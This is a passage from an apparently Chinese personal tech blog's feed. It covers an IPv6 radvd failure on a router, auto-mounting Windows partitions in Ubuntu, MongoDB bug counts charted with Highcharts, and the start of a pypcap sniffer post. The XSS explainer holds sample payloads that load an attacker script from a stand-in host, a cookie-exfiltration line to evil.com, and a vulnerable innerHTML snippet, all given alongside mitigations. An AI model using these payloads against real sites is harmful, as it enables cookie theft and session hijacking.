          TX packets:1476645 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:1200677624 (1.1 GiB)  TX bytes:1867999218 (1.7 GiB)
</code></pre>
<p>其中的<code>IPv6</code>地址如下：</p>
<pre><code class="sh">inet6 addr: 2002:76a7:859d:0:44f3:adff:fef9:f52/64 Scope:Global
inet6 addr: fe80::a263:91ff:fea7:6307/64 Scope:Link
</code></pre>
<p>第一个<code>IPv6</code>是用来与外部互联网通信的地址，第二个以<code>fe80::</code>开头的称为链路本地地址(Link-local address)，与<code>IPv4</code>中的<code>169.254.0.0/16</code>地址类似，此类地址不需要与外部网络通信，通常用于本地主机间的相互通讯。</p>
<h2 id="IPv6相关进程分析"><a href="#IPv6相关进程分析" class="headerlink" title="IPv6相关进程分析"></a>IPv6相关进程分析</h2><p>好了，现在的问题是什么导致<code>IPv6</code>忽然不见了，我最初想法是Router的<code>dhcpv6</code>服务器挂了，但是<code>ps |grep dhcp</code>后发现是正常的。</p>
<pre><code class="sh">$ ps |grep dhcp
 2951 root        368 S   udhcpd /tmp/udhcpd.conf
28323 root        352 S   /usr/sbin/dhcp6s -3 -c /tmp/dhcp6s.conf br0
</code></pre>
<p>此处说明一点，由于WAN端使用的<code>PPPoE</code>拨号上网方式，所以没有启动<code>dhcp6c</code>（用于获取ipv6的客户端程序）。那是不是还有其它相关的进程挂了呢？为此我问了下组长（大牛），发现确实还有个<code>radvd</code>进程！对比前后<code>log</code>中的<code>ps</code>输出发现确实是这个进程挂了！！！</p>
<blockquote>
<p><strong>路由广播守护</strong>（The Router Advertisement Daemon，简称：<code>radvd</code>）是一个符合<code>RFC 2461</code>使用邻居发现协议用于实现<code>IPv6</code>地址本地链接广播和<code>IPv6</code>路由前缀的开源软件。该软件是给系统管理员用于实现在<code>IPv6</code>下对主机进行无状态自动配置地址。<br>--- <a href="https://zh.wikipedia.org/wiki/Radvd" target="_blank" rel="noopener">维基百科</a></p>
</blockquote>
<p>总之，<code>radvd</code>也是<code>IPv6</code>必不可少的进程，而且莫名其妙的挂了。</p>
<h2 id="radvd进程退出原因分析"><a href="#radvd进程退出原因分析" class="headerlink" title="radvd进程退出原因分析"></a>radvd进程退出原因分析</h2><p>为了分析<code>radvd</code>进程退出原因，我尝试手动重启进程</p>
<pre><code class="sh">$ /usr/sbin/radvd -C /tmp/radvd.conf
[Feb 26 06:29:51] radvd: syntax error in /tmp/radvd.conf, line 19: {
[Feb 26 06:29:51] radvd: error parsing or activating the config file: /tmp/radvd.conf
</code></pre>
<p>提示配置文件第19语法错误，那来看一下<code>/tmp/radvd.conf</code></p>
<pre><code class="sh">$ cat /tmp/radvd.conf
interface br0 {
        AdvSendAdvert on;
        AdvCurHopLimit 64;
        MinRtrAdvInterval 198;
        MaxRtrAdvInterval 600;
        AdvOtherConfigFlag on;
        AdvDefaultLifetime 1800;
        AdvReachableTime 0;
        AdvRetransTimer 0;
        AdvDefaultPreference low;
        AdvHomeAgentFlag off;
        AdvManagedFlag off;
        prefix 2002:24e0:69cf:0::/64 {
                AdvOnLink on;
                AdvAutonomous on;
                AdvValidLifetime 2400;
                AdvPreferredLifetime 1800;
        };
        RDNSS  {
                AdvRDNSSPreference 8;
                AdvRDNSSLifetime 1200;
        };
};
</code></pre>
<p>第19行<code>RDNSS  {</code>与正常情况<code>RDNSS  fe80::a263:91ff:fea7:6307 {</code>相比少了链路本地地址，也就是<code>fe80::</code>开头的地址。那么这个问题是怎么产生的呢？为什么会少参数呢？这就需要来看具体的代码了。</p>
<h2 id="net6conf脚本分析"><a href="#net6conf脚本分析" class="headerlink" title="net6conf脚本分析"></a>net6conf脚本分析</h2><p>分析GUI相关代码后发现，在点击Router的<code>IPv6</code>配置页面的<code>Apply</code>按钮后，后台会执行<code>net6conf restart</code>，那么就需要分析<code>net6conf</code>代码</p>
<pre><code class="sh">$ grep -rn fe80:: net6conf
net6conf:97:    $IP -6 addr add fe80::$eui64/64 dev $bridge
net6conf:103:   $IP -6 addr add fe80::$ipv6_interface_id/64 dev $bridge
</code></pre>
<p>使用<code>grep</code>初步定位到链路本地地址的生成处，由于<code>net6conf</code>是个<code>shell</code>脚本，所以可以在代码附近添加一行<code>set -x</code>，然后手动执行<code>net6conf restart</code>，那么代码执行过程就会很详细的打印出来，接着找到生成链路本地地址的那一部分</p>
<pre><code class="sh">+ /usr/sbin/ip -6 addr add fe80::a263:91ff:fea7:6307/64 dev br0
RTNETLINK answers: Cannot allocate memory
</code></pre>
<p>OK，总算找到问题的关键所在了，程序在添加地址时出现了无法内存分配的错误。</p>
<h2 id="无法分配内存原因分析"><a href="#无法分配内存原因分析" class="headerlink" title="无法分配内存原因分析"></a>无法分配内存原因分析</h2><p>对于<code>RTNETLINK answers: Cannot allocate memory</code>,常规思路当然是内存不足了，但是通过<code>free</code>查看还有<code>200M+</code>绝对足够。然后谷歌一下，貌似遇到类似问题的也不少，比如<a href="https://bugzilla.redhat.com/show_bug.cgi?id=1221915" target="_blank" rel="noopener">IPv6 routing/neighbor table suspected memory leak</a>，也是跑了几天就出这个问题了。</p>
<p>大部分的解决方案是修改一个系统级的配置参数<code>net.ipv6.route.max_size</code>，这个参数定义了<code>IPv6</code>路由表的最大尺寸，默认值为4096Bytes，将其改大一点就可以了。</p>
<pre><code class="sh">$ sysctl net.ipv6.route.max_size
net.ipv6.route.max_size = 4096
$ sysctl -w net.ipv6.route.max_size=16384
net.ipv6.route.max_size = 16384
$ /usr/sbin/ip -6 addr add fe80::a263:91ff:fea7:6307/64 dev br0
</code></pre>
<p>修改完后重启<code>IPv6</code>，发现一切都回归正常了，Oh yeah😀</p>
<p>那么最后还剩一个问题，按理说<code>net.ipv6.route.max_size</code>是系统自带的默认参数，参数值也是经过实践验证的，一般来说是够用的，为什么会出现不够用的情况？依据网上的资料显示，可能是kernel memory leak, 具体原因还需进一步测试和验证，但至少目前增大这个参数确实能够解决问题！</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://zh.wikipedia.org/wiki/Radvd" target="_blank" rel="noopener">wikipedia - radvd</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=1221915" target="_blank" rel="noopener">IPv6 routing/neighbor table suspected memory leak</a></li>
<li><a href="http://ipv6.web.cern.ch/content/linux-ipv6-routing-table-maxsize-badly-dimensioned-compared-ipv4" target="_blank" rel="noopener">Linux IPv6 routing table max_size badly dimensioned compared to IPv4</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> Embedded </category>
            
        </categories>
        
        
        <tags>
            
            <tag> IPv6 </tag>
            
            <tag> router </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Ubuntu开机自动挂载Windows系统中的磁盘分区]]></title>
      <url>https://www.litreily.top/2019/02/17/mount/</url>
      <content type="html"><![CDATA[<p>本人电脑装有<code>ubuntu</code>和<code>windows</code>双系统，有时候需要在<code>ubuntu</code>下使用<code>windows</code>系统下的文件，每次手动挂载的话很麻烦，所以想让它开机自动挂载常用的<code>windows</code>磁盘分区。</p>
<h2 id="查看分区"><a href="#查看分区" class="headerlink" title="查看分区"></a>查看分区</h2><p>在挂载windows磁盘前，需要知道每个磁盘的路径或<code>UUID</code>，此时主要依靠<code>fdisk</code>和<code>blkid</code>两个指令，前一个指令获取分区信息，后一个指令获取<code>Block device</code>块设备的属性。</p>
<pre><code class="sh">$ sudo blkid
/dev/sda1: LABEL=&quot;Win10&quot; UUID=&quot;C4A0E65EA0E65708&quot; TYPE=&quot;ntfs&quot; PARTUUID=&quot;6190c592-01&quot;
/dev/sda2: UUID=&quot;AE3C137D3C133FAF&quot; TYPE=&quot;ntfs&quot; PARTUUID=&quot;6190c592-02&quot;
/dev/sdb1: LABEL=&quot;Apps&quot; UUID=&quot;0000678400004823&quot; TYPE=&quot;ntfs&quot; PARTLABEL=&quot;Basic data partition&quot; PARTUUID=&quot;45ed07d2-c9e3-4167-8868-3e33f62784e1&quot;
/dev/sdb2: LABEL=&quot;Data&quot; UUID=&quot;0000678400004823&quot; TYPE=&quot;ntfs&quot; PARTLABEL=&quot;Basic data partition&quot; PARTUUID=&quot;2a8b4bf1-8357-4d65-bed4-f73f01b96431&quot;
/dev/sdb3: LABEL=&quot;Backup&quot; UUID=&quot;0000678400004823&quot; TYPE=&quot;ntfs&quot; PARTLABEL=&quot;Basic data partition&quot; PARTUUID=&quot;a7187083-2820-4eef-83ff-05d8899879a2&quot;
</code></pre>
<p>从上面的输出结果就可以将Windows磁盘对应到具体的块设备路径<code>/dev/sdax</code>，因为电脑含两块磁盘，所以包含<code>sda</code>及<code>sdb</code>。这里的块设备路径和<code>UUID</code>会将下面的配置参数中用到。</p>
<h2 id="临时挂载方案"><a href="#临时挂载方案" class="headerlink" title="临时挂载方案"></a>临时挂载方案</h2><p>对于临时解决方案，可以使用以下指令将windows的C盘<code>/dev/sda1</code>挂载到<code>/mnt/c</code>目录</p>
<pre><code class="sh">sudo mkdir /mnt/c
sudo mount -t ntfs /dev/sda1 /mnt/c
</code></pre>
<p>此临时方案在系统重启后就将失效。对于卸载，使用<code>sudo umount /mnt/c</code>即可。</p>
<h2 id="开机挂载方案"><a href="#开机挂载方案" class="headerlink" title="开机挂载方案"></a>开机挂载方案</h2><h3 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h3><p>开机启动后自动挂载的方案就需要修改配置文件<code>/etc/fstab</code>啦,使用编辑器打开后，按以下格式添加新的挂载项</p>
<pre><code class="sh">$ cat /etc/fstab
# /etc/fstab: static file system information.
#
# Use &#39;blkid&#39; to print the universally unique identifier for a
# device; this may be used with UUID= as a more robust way to name devices
# that works even if disks are added and removed. See fstab(5).
#
# &lt;file system&gt; &lt;mount point&gt;   &lt;type&gt;  &lt;options&gt;       &lt;dump&gt;  &lt;pass&gt;
# / was on /dev/sdb5 during installation
UUID=4d2e5a83-d9fe-47bb-aa02-fee9ac8535e3 /               ext4    errors=remount-ro 0       1
# /boot was on /dev/sdb6 during installation
UUID=9b521dc2-ad85-4ca6-bb8b-f285b312aa49 /boot           ext4    defaults        0       2
# /home was on /dev/sdb7 during installation
UUID=f6b796dd-9e59-4f79-b70a-c2c8e5977163 /home           ext4    defaults        0       2
# swap was on /dev/sdb4 during installation
UUID=9430ea0e-7ff9-4167-9bf7-1f3e08d26d34 none            swap    sw              0       0
# /mnt/Data was on /dev/sdb2 during installation
/dev/sdb2                                /mnt/Data        ntfs    defaults        0       2
# /mnt/Backup was on /dev/sdb3 during installation
/dev/sdb3                                /mnt/Backup      ntfs    defaults        0       2
</code></pre>
<p>后面两项就是用来挂载Windows磁盘的，当然每行前面的<code>/dev/sdbx</code>也可以换成<code>UUID=xxxxx</code>，但是由于这两个磁盘的<code>UUID</code>一致，所以可能会有问题，也许可以使用<code>blkid</code>输出的<code>PARTUUID</code>，但我没试过。无论如何，以上的设置方法绝对是有效的。</p>
<h3 id="挂载测试"><a href="#挂载测试" class="headerlink" title="挂载测试"></a>挂载测试</h3><pre><code class="sh">sudo mkdir /mnt/{Data,Backup}
sudo mount -a
</code></pre>
<p>如果执行以上指令没有报错则说明挂载成功了，重启即可看到开机后系统已经自动挂载了设定号的磁盘。</p>
]]></content>
      
        <categories>
            
            <category> Linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ubuntu </tag>
            
            <tag> mount </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[XSS跨站脚本攻击]]></title>
      <url>https://www.litreily.top/2019/02/14/XSS/</url>
      <content type="html"><![CDATA[<p>近期遇到一堆 Stored XSS vulnerability 问题，即存储型跨站脚本漏洞，所以有必要学习一下XSS相关的知识。</p>
<h2 id="XSS简介"><a href="#XSS简介" class="headerlink" title="XSS简介"></a>XSS简介</h2><p><code>XSS</code>是跨站脚本<code>Cross-Site Scripting</code>的简写，至于为什么不是<code>CSS</code>，相信大家很容易猜到，是为了避免与前端的层叠样式表<code>Cascading Style Sheets</code>重名。</p>
<p><code>XSS</code>涉及三个要素：一个站点，攻击者和受害者。攻击者通过某站点的漏洞注入脚本到该站点，受害者在使用浏览器访问该站点时就可能遭受<code>XSS</code>攻击。</p>
<p>脚本类型不限于<code>javascript</code>, 也可以是其它脚本，如<code>VBScript</code>, <code>ActiveX</code> 和 <code>flash</code>等，但主要还是以<code>javascript</code>为主。</p>
<a id="more"></a>
<h2 id="XSS类型"><a href="#XSS类型" class="headerlink" title="XSS类型"></a>XSS类型</h2><p><code>XSS</code>的分类貌似没有固定标准，但约定俗成的被分为持久化的存储型XSS和非持久化的反射型XSS。</p>
<h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p><code>Stored XSS</code>, 持久化的，也就是说只要用户在浏览器打开了这个站点就会执行攻击者注入的脚本。此类<code>XSS</code>要求攻击者将脚本存储至站点服务器。</p>
<p>举个例子，很多论坛都有评论功能，攻击者可以通过评论把脚本信息存入站点服务器，如果站点未加过滤和编码，直接将脚本信息当做普通评论存入数据库，其他人访问该站点时就会执行该脚本。</p>
<h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p><code>Reflected XSS</code>, 非持久化的，需要用户打开站点后执行某些操作方能触发，比如点击某个链接，然后触发执行攻击者注入的脚本，脚本可以是一个代码段，也可以是指向攻击者提供的脚本链接。利用站点易受攻击的漏洞，就可以让用户执行任意脚本。</p>
<p>此类<code>XSS</code>攻击者通常使用邮件或是中间站点发送带有脚本的链接给用户，而链接往往看起来很正常，带有正规站点的域名，脚本部分可能使用16进制编码，不容易看出端倪。</p>
<p>下面引用的<a href="https://en.wikipedia.org/wiki/Cross-site_scripting#Non-persistent" target="_blank" rel="noopener">维基百科</a>的例子:</p>
<pre><code class="yml"># 攻击者提供的链接，在访问bobssite.org的搜索功能时执行脚本
http://bobssite.org/search?q=&lt;script%20type=&#39;application/javascript&#39;&gt;alert(&#39;xss&#39;);&lt;/script&gt;

# 下面的链接触发后会执行攻击者服务器中的脚本authstealer.js
http://bobssite.org/search?q=puppies&lt;script%20src=&quot;http://mallorysevilsite.com/authstealer.js&quot;&gt;&lt;/script&gt;

# 下面是经过预先编码后的链接
http://bobssite.org/search?q=puppies%3Cscript%2520src%3D%22http%3A%2F%2Fmallorysevilsite.com%2Fauthstealer.js%22%3E%3C%2Fscript%3E
</code></pre>
<h3 id="DOM-Based-XSS"><a href="#DOM-Based-XSS" class="headerlink" title="DOM-Based XSS"></a>DOM-Based XSS</h3><p>基于DOM(Document Object Model)的<code>XSS</code>与以上两种不同的是，它完全发生在客户端，与服务器端无关，但同时又可以算是反射型<code>XSS</code>的子集，因为它也需要一定的交互才能触发。</p>
<p><code>DOM-Based XSS</code>原理：站点获取用户输入数据，然后通过站点自带的js代码修改<code>DOM</code>结构，如果输入的数据携带有恶意代码，就可能导致<code>XSS</code>攻击。</p>
<p>举个例子，以下代码用来显示访问链接（如：<code>http://www.example.com?name=test</code>）中携带的用户名</p>
<pre><code class="js">var namePos=document.URL.indexOf(&quot;name=&quot;)
if (namePos != -1)
{
    var name = document.createElement(&#39;span&#39;);
    name.innerHTML = document.URL.substring(namePos, document.URL.length)
}
</code></pre>
<p>如果用户名包含了恶意代码，如<code>&lt;/span&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&lt;span&gt;</code>，这就会在原先想要生成的<code>span</code>标签后加入攻击者的脚本并执行。</p>
<h2 id="XSS攻击的危害与防范"><a href="#XSS攻击的危害与防范" class="headerlink" title="XSS攻击的危害与防范"></a>XSS攻击的危害与防范</h2><p>通过<code>XSS</code>攻击，攻击者可以获取用户的敏感信息，例如在用户完全不知情的情况下拿到用户登录后的<code>Cookie</code>信息，之后通过会话劫持冒充真实用户访问网站，和盗号一样，攻击者可以修改账户密码，获取账户内的私人信息甚至财产。更近一步，如果攻击者用此方法获取到了站点管理员的账户，那么将可能拿到站点的控制权。</p>
<p>具体例子可以参考<a href="https://www.acunetix.com/websitesecurity/cross-site-scripting/" target="_blank" rel="noopener">Cross-site Scripting (XSS) Attack</a></p>
<pre><code class="js">window.location=&quot;http://evil.com/?cookie=&quot; + document.cookie
</code></pre>
<p>那么<code>XSS</code>该如何防范呢？</p>
<ol>
<li><p>常用办法是进行特殊字符替换，对于所有的用户输入，需要进行过滤检查，对于上下文输出，将<code>&lt;&gt;/\#$&amp;?&#39;&quot;</code>等字符编码转义为对应的<code>html</code>码，这也是我们当前使用最多的方案；</p>
</li>
<li><p>对于不信任的用户输入，可以使用专门的机制（如：<a href="https://en.wikipedia.org/wiki/HTML_sanitization" target="_blank" rel="noopener">HTML sanitization</a>）去辨别输入的有效性。</p>
</li>
<li><p>而对于<code>Cookie</code>，为了防止攻击者使用窃取的<code>Cookie</code>进行访问，可以通过绑定用户<code>IP</code>和<code>Cookie</code>，仅允许指定<code>IP</code>的用户使用特定<code>Cookie</code>才有效。</p>
</li>
</ol>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>本文简述了<code>XSS</code>的概念，介绍了存储型、反射型和<code>DOM-Based</code>三种<code>XSS</code>攻击手段，并予以举例说明，最后简单介绍了<code>XSS</code>危害及其常用防范手段。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://www.acunetix.com/websitesecurity/cross-site-scripting/" target="_blank" rel="noopener">Cross-site Scripting (XSS) Attack</a></li>
<li><a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet" target="_blank" rel="noopener">XSS Filter Evasion Cheat Sheet</a></li>
<li><a href="https://en.wikipedia.org/wiki/Cross-site_scripting" target="_blank" rel="noopener">Wikipedia - Cross-site scripting</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> Network </category>
            
            <category> Security </category>
            
        </categories>
        
        
        <tags>
            
            <tag> xss </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Python之MongoDB数据分析及其Highcharts可视化]]></title>
      <url>https://www.litreily.top/2019/01/22/highcharts/</url>
      <content type="html"><![CDATA[<p>近期使用<code>requests</code>把内部<code>bugziila</code>上的<code>bug</code>数据爬取了一遍，并存入了本地的<code>MongoDB</code>数据库，想着对数据做些简单的可视化处理，将所有产品的bug数做一个统计和可视化，于是便有了这篇简短的文章。</p>
<a id="more"></a>
<h2 id="MongoDB中的数据存储格式"><a href="#MongoDB中的数据存储格式" class="headerlink" title="MongoDB中的数据存储格式"></a>MongoDB中的数据存储格式</h2><p>之前爬取数据后，存入<code>MongoDB</code>的数据格式如下，而我要分析的仅仅是其中的<code>metadata.Product</code></p>
<pre><code class="json">{
    &quot;_id&quot; : ObjectId(&quot;5c3ea1d3fbf7884588041acc&quot;),
    &quot;id&quot; : 1,
    &quot;title&quot; : &quot;\&quot;Show interface dot11radio advanced\&quot; command doesn&#39;t work&quot;,
    &quot;metadata&quot; : {
        &quot;Status&quot; : &quot;已解決 (RESOLVED) 已修復 (FIXED)&quot;,
        &quot;Product&quot; : &quot;AP54GTSW&quot;,
        &quot;Component&quot; : &quot;Baseline&quot;,
        &quot;Version&quot; : &quot;0.1&quot;,
        &quot;Platform&quot; : &quot;PC Linux&quot;,
        &quot;Importance&quot; : &quot;P2 normal&quot;,
        &quot;Assigned&quot; : &quot;Wallace Peng&quot;,
        &quot;Reported_author&quot; : &quot;happy Hu&quot;,
        &quot;Reported&quot; : &quot;2004-05-11 20:32 CST&quot;,
        &quot;Modified&quot; : &quot;2010-08-27 15:42 CST&quot;
    },
    &quot;comments&quot; : {
        &quot;描述&quot; : {
            &quot;user&quot; : &quot;happy Hu&quot;,
            &quot;time&quot; : &quot;2004-05-11 20:32:24 CST&quot;,
            &quot;text&quot; : &quot;\&quot;Show interface dot11radio advanced\&quot; command doesn&#39;t work -- Happy&quot;
        },
        &quot;意見1&quot; : {
            &quot;user&quot; : &quot;Wallace Peng&quot;,
            &quot;time&quot; : &quot;2004-05-12 21:01:56 CST&quot;,
            &quot;text&quot; : &quot;image 0.1rc8 fixed this bug. -- Wallace&quot;
        }
    }
}
</code></pre>
<h2 id="读取MongoDB数据"><a href="#读取MongoDB数据" class="headerlink" title="读取MongoDB数据"></a>读取MongoDB数据</h2><h3 id="获取所有产品名称"><a href="#获取所有产品名称" class="headerlink" title="获取所有产品名称"></a>获取所有产品名称</h3><p>首先获取所有产品名称，可以通过<code>pymongo</code>库的find函数获取<code>metadata.Product</code>段数据。</p>
<pre><code class="python">from pymongo import MongoClient
import os

MONGOSERVER = &#39;localhost:27017&#39;
DATABASE = &#39;bugzilla&#39;
COLLECTION = &#39;bugs&#39;

class Analysis(object):
    def __init__(self):
        client = MongoClient(MONGOSERVER)
        db = client[DATABASE]
        self.col = db[COLLECTION]

    def getAllProductsName(self):
        records = self.col.find({}, {&#39;metadata.Product&#39;:1, &#39;_id&#39;:0})
        prdoucts = [ record[&#39;metadata&#39;][&#39;Product&#39;] for record in records ]
        prdoucts = list(set(prdoucts))
        prdoucts = sorted(prdoucts, key=lambda s: s.lower())
        return prdoucts
</code></pre>
<p><code>MongoClient</code>用来打开一个client去连接数据库，通过指定<code>database</code>和<code>collection</code>可以定位到数据源，再用<code>find</code>函数检索出产品名称信息。以上的<code>getAllProductsName</code>后面通过<code>set</code>集合的方式去重，最后通过<code>sorted</code>进行排序，即可获得有序的产品名称<code>products</code>。</p>
<h3 id="获取产品bug数"><a href="#获取产品bug数" class="headerlink" title="获取产品bug数"></a>获取产品bug数</h3><p>当然，我们想要的其实是产品bug数量，对于单个产品，可以通过<code>pymongo</code>库的<code>count_documents</code>函数获得该指定产品bug数。</p>
<pre><code class="py">    def countOneProduct(self, product):
        return self.col.count_documents({&#39;metadata.Product&#39;:product})  
</code></pre>
<p>想要获取所有的产品bug数，简单的想法当然是循环调用<code>countOneProduct</code>函数，但这样会需要大量的时间，9万多条数据量需24s左右的时间。为什么这么久，因为每次执行<code>count_documents</code>都需要重新遍历一遍数据库，这显然是不合适的。更好的方法是只遍历一遍数据库，然后对不同产品的bug数进行区分统计。</p>
<pre><code class="py">    def countAllProducts(self):
        counts = {}
        records = self.col.find({}, {&#39;metadata.Product&#39;:1, &#39;_id&#39;:0})
        prdoucts = [ record[&#39;metadata&#39;][&#39;Product&#39;] for record in records ]
        for product in prdoucts:
            if product in counts:
                counts[product] += 1
            else:
                counts[product] = 1
        counts = sorted(counts.items(), key=lambda item: item[0].lower())
        return counts
</code></pre>
<p>以上代码段首先找出数据库每条记录的<code>metadata.Product</code>信息，然后循环判别<code>product</code>名称，对不同产品的出现次数进行计数，然后存入相应的字典记录<code>counts[product]</code>中，总耗时约1s。</p>
<h3 id="保存数据至json文件"><a href="#保存数据至json文件" class="headerlink" title="保存数据至json文件"></a>保存数据至json文件</h3><pre><code class="py">    def saveProductsIssues(self, path):
        counts = self.countAllProducts()
        with open(path, &#39;w&#39;, encoding=&#39;utf-8&#39;) as f:
            f.write(&#39;{\n&#39;)
            f.write(&#39;,\n&#39;.join([&#39;&quot;{}&quot;:{}&#39;.format(key, val) for key,val in counts]))
            f.write(&#39;\n}&#39;)
</code></pre>
<p>保存数据时，需要使用<code>utf-8</code>格式，否则可能出现后续可视化时的中文乱码问题。</p>
<h2 id="Highcharts数据可视化"><a href="#Highcharts数据可视化" class="headerlink" title="Highcharts数据可视化"></a>Highcharts数据可视化</h2><p><a href="https://www.highcharts.com/" target="_blank" rel="noopener">Highcharts</a>是一款超级棒的用于<code>web</code>端数据可视化的<code>js</code>库，图表样式及其丰富，使用简单，强烈推荐！！！</p>
<p>我们要做的就是把<code>highcharts</code>的js库文件下载到本地，然后拷贝一个例程，最后修改一下数据来源即可，下面是针对<code>bug</code>数选择的一个图表样式对应的<code>html</code>文件</p>
<pre><code class="html">&lt;!DOCTYPE HTML&gt;
&lt;html&gt;
    &lt;head&gt;
        &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;
        &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;
        &lt;title&gt;Highcharts Example&lt;/title&gt;

        &lt;style type=&quot;text/css&quot;&gt;

        &lt;/style&gt;
    &lt;/head&gt;
&lt;body&gt;
&lt;!-- 下面是需要引入的库，包含JQuery及highcharts库 --&gt;
&lt;script src=&quot;https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.3.1.min.js&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;./code/highcharts.js&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;./code/modules/exporting.js&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;./code/modules/export-data.js&quot;&gt;&lt;/script&gt;

&lt;!-- 根据数据量大小修改下方的显示范围 --&gt;
&lt;div id=&quot;container&quot; style=&quot;min-width: 310px; max-width: 800px; height: 600px; margin: 0 auto&quot;&gt;&lt;/div&gt;
&lt;script type=&quot;text/javascript&quot;&gt;
// 使用$.ajax导入数据，并配置Highcharts参数
$.ajax({
    url: &#39;products.json&#39;,
    dataType: &#39;json&#39;,
    contentType: &#39;application/json; charset=utf-8&#39;,
    success: function (src) {
        var categories = new Array();
        var data = new Array();
        for (item in src){
            categories.push(item)
            data.push(src[item])
        }

        Highcharts.chart(&#39;container&#39;, {
            chart: {
                type: &#39;bar&#39;
            },
            title: {
                text: &#39;All products issues number on bugzilla&#39;
            },
            subtitle: {
                text: &#39;Source: bugzilla&#39;
            },
            xAxis: {
                // 更改分类
                categories: categories,
                title: {
                    text: null
                }
            },
            yAxis: {
                min: 0,
                title: {
                    text: &#39;Issues&#39;,
                    align: &#39;high&#39;
                },
                labels: {
                    overflow: &#39;justify&#39;
                }
            },
            tooltip: {
                valueSuffix: &#39;&#39;
            },
            plotOptions: {
                bar: {
                    dataLabels: {
                        enabled: true
                    }
                }
            },
            legend: {
                layout: &#39;vertical&#39;,
                align: &#39;right&#39;,
                verticalAlign: &#39;top&#39;,
                x: -40,
                y: 80,
                floating: true,
                borderWidth: 1,
                backgroundColor: ((Highcharts.theme &amp;&amp; Highcharts.theme.legendBackgroundColor) || &#39;#FFFFFF&#39;),
                shadow: true
            },
            credits: {
                enabled: false
            },
            series: [{
                name: &#39;Issues Number&#39;,
                // 更改数据来源
                data: data
            }]
        });
    }
}
)
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>以上最主要的一段代码如下，通过JQuery的ajax读取web server中的json文件，同时将json数据的key和value分离至<code>categories</code>和<code>data</code></p>
<pre><code class="js">$.ajax({
    url: &#39;products.json&#39;,
    dataType: &#39;json&#39;,
    contentType: &#39;application/json; charset=utf-8&#39;,
    success: function (src) {
        var categories = new Array();
        var data = new Array();
        for (item in src){
            categories.push(item)
            data.push(src[item])
        }
</code></pre>
<h3 id="可视化效果展示"><a href="#可视化效果展示" class="headerlink" title="可视化效果展示"></a>可视化效果展示</h3><p>为了方便展示，我仅仅截取了一段数据，<code>product</code>名称做了随机替换处理，毕竟主要还是看可视化效果嘛。</p>
<p><img src="/assets/highcharts/all-products-issues.svg" alt="Product bugs"></p>
<h2 id="随机替换字符串"><a href="#随机替换字符串" class="headerlink" title="随机替换字符串"></a>随机替换字符串</h2><p>上面提到对<code>product</code>名称进行随机替换处理，其代码如下：</p>
<pre><code class="py">import json
import secrets
import string
import numpy as np

with open(&#39;products.json&#39;,&#39;r&#39;,encoding=&#39;utf-8&#39;) as f:
    data = json.load(f)

new = {}
for key, val in data.items():
    N = np.random.randint(5,20)
    key = &#39;&#39;.join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(N))
    new[key] = val

with open(&#39;products_new.json&#39;,&#39;w&#39;,encoding=&#39;utf-8&#39;) as f:
    json.dump(new, f, indent=4)
</code></pre>
<p>该替换方法参考以下文章:</p>
<ul>
<li><a href="https://codeday.me/bug/20180821/225180.html" target="_blank" rel="noopener">在Python 3中生成随机长度的随机类字符串的最快方法</a></li>
</ul>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>本文介绍了如何检索<code>MongoDB</code>中的数据，如何将数据存入json文件，以及如何使用<code>highcharts</code>实现数据可视化，最后给出了随机替换字符串的一种实现方法。</p>
]]></content>
      
        <categories>
            
            <category> Python </category>
            
        </categories>
        
        
        <tags>
            
            <tag> visualization </tag>
            
            <tag> MongoDB </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Python之pypcap库的安装及简单抓包工具的实现]]></title>
      <url>https://www.litreily.top/2018/12/31/pypcap-install/</url>
      <content type="html"><![CDATA[<p><a href="https://github.com/pynetwork/pypcap" target="_blank" rel="noopener">pypcap</a>是一个对<code>libpcap</code>C库进行封装和简化的面向对象的抓包工具库，可以非常方便的用于抓包和过滤，结合<code>dpkt</code>解析库可以完成许多网络数据包的抓取和分析。本文讲述的就是如何使用<code>pypcap</code>及<code>dpkt</code>库实现简单抓包工具，也称为嗅探器(sniffer).</p>
<h2 id="Linux-端安装-pypcap"><a href="#Linux-端安装-pypcap" class="headerlink" title="Linux 端安装 pypcap"></a>Linux 端安装 pypcap</h2><pre><code class="bash">sudo apt-get install libpcap-dev
sudo pip install pypcap
</code></pre>
<p>这里有个问题,如果使用<code>Anaconda</code>目录的<code>pip</code>安装则可能失败,目前原因未明,但官方的<code>python3</code>对应的<code>pip3</code>及<code>python2</code>对应的<code>pip</code>均无此问题.</p>
<a id="more"></a>
<h2 id="Windows-端安装-pypcap"><a href="#Windows-端安装-pypcap" class="headerlink" title="Windows 端安装 pypcap"></a>Windows 端安装 pypcap</h2><p>根据<code>pypcap</code>官方说明：</p>
<blockquote>
